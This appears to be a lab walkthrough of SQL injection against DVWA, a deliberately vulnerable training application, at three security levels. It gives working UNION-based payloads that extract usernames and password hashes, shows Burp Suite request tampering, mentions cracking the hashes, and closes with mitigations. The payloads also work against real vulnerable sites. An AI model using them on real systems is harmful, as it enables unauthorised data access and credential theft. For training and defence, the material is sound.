# SQL Injection - DVWA Walkthrough

Objective: 
Demonstrate SQL Injection (SQLi) vulnerabilities in DVWA (Damn Vulnerable Web Application) by retrieving user information and password hashes from the backend database.

## 🔓 Security Level: LOW

DVWA has the function, where user can enter ID and the application retreives First name and Surname that belongs to the ID.

![image](https://github.com/user-attachments/assets/005092a9-d8cf-4a4c-ba74-a35df6a30880)

The backend SQL query used is:

```bash
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

⚠️ Vulnerability
- No input validation or sanitization.
- Entering a single quote (') causes a SQL error— an indicator of SQLi vulnerability.

SQL Injection Payload

Input:
```
1' OR '1'='1
```

Backend injected SQL query:
```
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1' = '1';
```
Since '1' = '1' is always true, select statement returns all the values present in the database.

![image](https://github.com/user-attachments/assets/0c4da4b5-a72d-47da-8109-15b00490db87)

---

## 🥷 Extracting Passwords via UNION-Based SQLi

### Step 1: Determine Column Count
First, we need find number of columns present in the `user` table. We can confirm this by passing the following crafted input.

- `' order by 1#` - causes fatal error
- `' order by 2#` - No error
- `' order by 3#` - fatal error

This confirms that there are 2 columns.

### Step 2: Find datatype of the columns.

Test payload:
- `' UNION SELECT 'abc','abc' from users #`

From MariaDB knowledge base, we can figure out the column names.

https://mariadb.com/kb/en/mysql-user-table/

### Step 3: Extract Credentials
Now, use the found column names (user, password) in the union sql injection

```
' UNION SELECT user, password from users #

```

Query returned username and password hashes.

![image](https://github.com/user-attachments/assets/a6ce6916-997a-4980-8cf1-54ac567905fc)

---

## 🧰 Burp suite usage:

- Intercept the request using Burp Suite.
- Modify the input with the UNION payload.
- URL encode if necessary and send the request.

Request from the application is intercepted and sent to repeater.

Payload:
```bash
' UNION SELECT user, password from users #
```
Request:

![image](https://github.com/user-attachments/assets/b7e726d3-8571-43ab-8fc3-cc4415bbb7d1)

The response received:

![image](https://github.com/user-attachments/assets/d7ef67f5-55c8-45d1-a9b5-6438c2934162)


The password hashes can be cracked using tools like Hashcat or online hash databases.


## 🛡️ Security Level: Medium

Here, the query becomes:

```bash
$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

In medium level security, the input id is directly used in the sql statement.
Parameters like single quotes are escaped.

```
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
```

![image](https://github.com/user-attachments/assets/f5e83c21-85de-4c57-8c39-a6974a1d3576)

### 🔐 Workaround: No Quotes Allowed

Craft input without quotes:

```bash
1 or 1=1 UNION SELECT user,password FROM users#
```

This injects successfully, bypassing the escape function:

![image](https://github.com/user-attachments/assets/69a4bc3e-984a-472c-b158-20abcbc9b63e)

This successfully gets injected to the SQL source code, retriving data from users table.

Injected Query:
```bash
SELECT firstname, lastname FROM users WHERE user_id = 1 or 1=1 UNION SELECT user,password FROM users#
```

![image](https://github.com/user-attachments/assets/6d69cc5b-cdf6-41ec-8b0f-13a950b9aa42)

## 🔐 Security Level: High

Use the crafted input similar to the one that we used in security level: Low.

```bash
1' UNION SELECT user,password FROM users#
```

![image](https://github.com/user-attachments/assets/a095e9be-f1aa-4fb0-8db5-0a1861d4e297)


---

Attacker is able to exploit this SQL Injection vulnerability because the input parameters supplied by the users are directly passed to the database to retreive information back to the application. 

---
## 🧩 Conclusion

SQL Injection in DVWA is exploitable at low and medium levels due to:
- Direct concatenation of user inputs into SQL queries.
- Lack of prepared statements or parameterization.

Mitigation Techniques:
- Use prepared statements or ORMs.
- Always validate and sanitize user input.
- Apply principle of least privilege to database users.
